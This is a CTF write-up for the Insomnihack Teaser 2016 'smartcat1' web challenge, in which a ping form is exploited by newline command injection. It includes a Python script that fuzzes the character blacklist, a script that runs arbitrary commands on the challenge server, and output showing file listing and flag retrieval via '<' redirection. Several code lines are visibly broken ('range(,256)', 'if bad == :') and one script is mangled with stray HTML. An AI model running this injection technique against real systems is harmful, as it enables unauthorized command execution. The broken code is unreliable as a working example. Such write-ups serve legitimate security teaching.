---
id: 488
title: 'Insomnihack Teaser 2016 - smartcat1 - 50 pt Web Challenge'
date: 2016-01-17T21:00:52+00:00
author: Kris
layout: post
guid: https://ctf.rip/?p=488
permalink: /insomnihack-teaser-2016-smartcat1-50-pt-web-challenge/
post_views_count:
  - "1066"
image: /images/2016/01/insomnihack.png
categories:
  - Write-Ups
---
<img class="wp-image-489 aligncenter" src="/images/2016/01/smartcat1.png" alt="smartcat1" width="546" height="286" srcset="/images/2016/01/smartcat1.png 707w, /images/2016/01/smartcat1-300x157.png 300w, /images/2016/01/smartcat1-660x346.png 660w" sizes="(max-width: 546px) 100vw, 546px" />

Happy new year CTFers! 2016 brings a us a super fun Insomnihack teaser. The theme being Internet of <del>Things</del> $h!T.

This first challenge was really trivial but probably stumped some people judging by IRC. Funny thing is I had just recently solved a very similar challenge in another CTF so the first thing I tried worked.

So we read the clue and all we really have is a link, at the link (<http://smartcat.insomnihack.ch/cgi-bin/index.cgi>) we're greeted with a "ping destination" input box like this:

<img class="wp-image-493 aligncenter" src="/images/2016/01/smartcat11.png" alt="smartcat11" width="538" height="493" srcset="/images/2016/01/smartcat11.png 805w, /images/2016/01/smartcat11-300x275.png 300w, /images/2016/01/smartcat11-768x703.png 768w, /images/2016/01/smartcat11-660x604.png 660w" sizes="(max-width: 538px) 100vw, 538px" />

Ok so immediately your "command injection" alarm bells ring all at once, and yeah you're right. There's a blacklist of acceptable characters though and the usual assortment of command injection characters like $, \`, |, & and so on are rejected:

<img class="wp-image-494 aligncenter" src="/images/2016/01/smartcat12.png" alt="smartcat12" width="317" height="135" srcset="/images/2016/01/smartcat12.png 415w, /images/2016/01/smartcat12-300x128.png 300w" sizes="(max-width: 317px) 100vw, 317px" />

At this point I want to map out the blacklist definitively so I create some Python code to enumerate the script's responses to inputs. The below script just sends each possible character, then the "id" command and then parses for possible error messages:

```
#!/usr/bin/python

import requests

URL = 'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'

s = requests.Session()

for i in range(,256):
  payload = { 'dest' : chr(i) + 'id' + chr(i)}
  bad = 

  print "[*] Trying " + hex(i)
  print "[*] Trying " + payload['dest']
  r = s.post(URL, data=payload)

  for line in r.content.splitlines():
    if 'Error running ping' in line:
      bad+=1
      print line

    if 'Bad character' in line:
      bad += 1
      print line

  if bad == :
    print r.content

```

Which, rather quickly returns me a successful payload execution when i = 0x0a:
  
```
[*] Trying 0x9
[*] Trying 	id	
  Bad character 	 in dest
[*] Trying 0xa
[*] Trying 
id
Smart Cat debugging interface
Ping destination:
Ping results:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ok so we can get command execution, but letting the script play out, we have found a pretty depressing set of restricted input characters consisting of:

  * <space>, $, ;, &, |, (, {, \` and <tab>

Fortunately we have shell redirection characters "<" and ">" and that's all we need. We first have to track down the flag, I issue an "ls" command to see the files in the current directory, using this script:



```
#!/usr/bin/python

import requests
import sys

URL = 'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'

s = requests.Session()

payload = { 'dest' : chr(10) + sys.argv[1] }

r = s.post(URL, data=payload)

preparsing = False
for line in r.content.splitlines():
  if '
```
' in line:
    preparsing = False

  if preparsing:
    print line

  if '

'</span> in line:
    print line.replace("

"</span>,"")
    preparsing = True

```

Where I find a interesting file or folder called "there":

```
root@ubuntu:~/insomnihack/smartcat# ./sc_cmd.py ls
  index.cgi
there

```

I issue the "find" command to investigate further which leads me to the flag, as seen here:

```
root@ubuntu:~/insomnihack/smartcat# ./sc_cmd.py find
  .
./index.cgi
./there
./there/is
./there/is/your
./there/is/your/flag
./there/is/your/flag/or
./there/is/your/flag/or/maybe
./there/is/your/flag/or/maybe/not
./there/is/your/flag/or/maybe/not/what
./there/is/your/flag/or/maybe/not/what/do
./there/is/your/flag/or/maybe/not/what/do/you
./there/is/your/flag/or/maybe/not/what/do/you/think
./there/is/your/flag/or/maybe/not/what/do/you/think/really
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
root@ubuntu:~/insomnihack/smartcat# ./sc_cmd.py cat \<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag

  INS{warm_kitty_smelly_kitty_flush_flush_flush}
```